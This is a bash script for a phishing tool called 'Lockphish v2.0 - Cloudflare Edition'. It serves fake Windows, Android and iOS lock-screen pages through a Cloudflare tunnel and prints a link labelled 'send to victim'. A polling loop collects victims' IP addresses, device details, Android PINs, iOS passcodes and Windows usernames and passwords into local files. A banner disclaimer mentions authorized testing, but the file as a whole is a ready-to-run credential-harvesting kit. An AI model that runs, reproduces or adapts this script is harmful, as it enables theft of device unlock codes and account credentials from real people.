#!/bin/bash
# Lockphish v2.0 - Cloudflare Edition (Modified by Ibrahim Mustafa)
# Original by: github.com/kali-linux-tutorial/lockphish

trap 'printf "\n";stop' 2

banner() {
printf "\e[1;33m    __            _    \e[0m\e[1;77m      _     _     _      \e[0m\n"
printf "\e[1;33m   / /  ___   ___| | __\e[0m\e[1;77m_ __ | |__ (_)___| |__   \e[0m\n"
printf "\e[1;33m  / /  / _ \ / __| |/ /\e[0m\e[1;77m '_ \| '_ \| / __| '_ \  \e[0m\n"
printf "\e[1;33m / /__| (_) | (__|   <|\e[0m\e[1;77m |_) | | | | \__ \ | | | \e[0m\n"
printf "\e[1;33m \____/\___/ \___|_|\_\ \e[0m\e[1;77m.__/|_| |_|_|___/_| |_| By Ibrahim Mustafa\e[0m\n"
printf "\e[1;77m                      |_|                  \e[0m\e[1;33mv2.0\e[0m\n"
printf " \n\e[1;77m coded by: Ibrahim Mustafa\e[0m\n"
printf " \e[1;77mGitHub: https://github.com/ibrahimmustafacv\e[1;77m\e[0m"
printf "\n\n\n\e[1;91m Disclaimer: this tool is designed for security\n"
printf " testing in an authorized simulated cyberattack\n"
printf " Attacking targets without prior mutual consent\n"
printf " is illegal! by Ibrahim Mustafa\n\n"
}

stop() {
pkill -f -2 cloudflared > /dev/null 2>&1
pkill -f -2 php > /dev/null 2>&1
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Aborting."; exit 1; }
}

check_cloudflared() {
if command -v cloudflared > /dev/null 2>&1; then
    echo "[+] cloudflared found."
else
    echo "[!] cloudflared not found. Installing..."
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/cloudflared
    echo "[+] cloudflared installed."
fi
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
    catch_ip
    rm -rf ip.txt
fi
if [[ -e "pin.txt" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
    pin=$(tail -n1 pin.txt)
    printf "\e[1;92m[\e[0m+\e[1;92m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
    printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
    cat pin.txt >> pin.saved.txt
    rm -rf pin.txt
fi
if [[ -e "passwords.txt" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Win credentials received!\e[0m\n"
    username=$(tail -n1 usernames.txt)
    password=$(tail -n1 passwords.txt)
    printf "\e[1;92m[\e[0m+\e[1;92m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
    printf "\e[1;92m[\e[0m+\e[1;92m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
    printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
    cat usernames.txt >> win.saved.txt
    cat passwords.txt >> win.saved.txt
    rm -rf usernames.txt
    rm -rf passwords.txt
fi
if [[ -e "passcode.txt" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] IOS passcode received!\e[0m\n"
    passcode=$(tail -n1 passcode.txt)
    printf "\e[1;92m[\e[0m+\e[1;92m] Passcode:\e[0m\e[1;77m  %s\e[0m\n" $passcode
    printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m  passcode.txt\e[0m\n"
    cat passcode.txt >> passcode.saved.txt
    rm -rf passcode.txt
fi
sleep 0.5
done
}

build_pages() {
link=$1
url=$redirect
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages...\e[0m\n"
sed 's+forwarding_url+'$url'+g' post.php > cat.php
sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
IFS=$'\n'
data_base64=$(base64 -w 0 win2.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+index+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html
}

cloudflare_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare Tunnel...\n"
cloudflared tunnel --url http://localhost:3333 2> /tmp/cf_log.txt &
sleep 8
# Extract URL from cloudflared logs
link=$(grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com' /tmp/cf_log.txt | head -1)
if [[ -z "$link" ]]; then
    echo "[!] Failed to get Cloudflare URL. Retrying..."
    sleep 3
    link=$(grep -o 'https://[a-z0-9\-]*\.trycloudflare\.com' /tmp/cf_log.txt | head -1)
fi
printf "\e[1;92m[\e[0m+\e[1;33m] Direct link (send to victim):\e[0m\e[1;77m %s\e[0m\n" $link
build_pages $link
checkfound
}

redirect() {
default_redirect="https://www.youtube.com"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m Youtube \e[0m\e[1;33m): \e[0m'
read redirect
redirect="${redirect:-${default_redirect}}"
}

banner
dependencies
check_cloudflared
redirect
cloudflare_server
